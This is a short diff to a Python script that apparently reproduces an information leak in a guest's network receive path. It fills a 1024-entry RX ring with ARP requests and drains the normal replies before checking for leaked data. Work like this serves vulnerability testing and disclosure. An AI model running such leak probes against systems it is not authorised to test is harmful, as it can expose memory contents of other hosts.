@@ -84,12 +84,12 @@ if __name__ == "__main__":
     try:
         prime = prime_frame()
         short = short_arp()
-        # Fill and wrap the single-queue RX ring with valid ARP requests. Their
+        # Fill and wrap the maximum 1024-entry single-queue RX ring with valid ARP requests. Their
         # normal replies are drained so they cannot be mistaken for the leak.
-        for _ in range(512):
+        for _ in range(1024):
             sock.send(prime)
         time.sleep(0.1)
-        primed = drain_prime_replies(2.0)
+        primed = drain_prime_replies(4.0)
         if primed == 0:
             raise SystemExit("FAIL: guest did not answer the full ARP priming requests")
         print(f"OBSERVED: drained {primed} normal replies to full ARP priming requests")
